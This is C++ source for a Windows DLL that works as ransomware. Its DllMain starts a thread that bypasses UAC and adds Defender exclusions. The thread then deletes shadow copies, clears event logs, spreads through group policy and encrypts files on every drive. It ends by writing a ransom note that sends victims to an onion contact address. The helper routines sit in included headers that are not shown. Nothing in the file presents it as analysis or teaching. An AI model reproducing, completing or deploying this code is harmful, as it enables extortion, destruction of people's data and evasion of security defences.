#include <windows.h>
#include <shlobj.h>
#include "iocp_engine.h"
#include "evasion.h"
#include "encrypt.h"
#include "spread.h"

static DWORD WINAPI payload_thread(LPVOID) {
    uac_bypass();
    Sleep(2000);
    add_defender_exclusions();
    wipe_shadow_copies();
    clear_event_logs();

    encryptor_init();

    spread_via_gpo();

    IOCPEngine engine;
    engine.start([](const wchar_t* path) {
        unlock_file_via_restart_manager(path);
        encrypt_file(path);
    });

    DWORD drives = GetLogicalDrives();
    wchar_t root[] = L"A:\\";
    for (int i = 0; i < 26; i++) {
        if (drives & (1 << i)) {
            root[0] = L'A' + i;
            enumerate_and_encrypt(root);
        }
    }

    engine.wait_all();

    wchar_t note_path[MAX_PATH];
    SHGetFolderPathW(NULL, CSIDL_DESKTOPDIRECTORY, NULL, 0, note_path);
    wcscat_s(note_path, L"\\HOW_TO_DECRYPT.README");

    HANDLE hNote = CreateFileW(note_path, GENERIC_WRITE, 0,
                               NULL, CREATE_ALWAYS, 0, NULL);
    const char* note =
        "Your files have been encrypted.\n"
        "Send victim ID to: contact@[redacted].onion\n";
    DWORD w;
    WriteFile(hNote, note, (DWORD)strlen(note), &w, NULL);
    CloseHandle(hNote);

    return 0;
}

BOOL APIENTRY DllMain(HMODULE hMod, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_ATTACH) {
        DisableThreadLibraryCalls(hMod);
        CreateThread(NULL, 0, payload_thread, NULL, 0, NULL);
    }
    return TRUE;
}
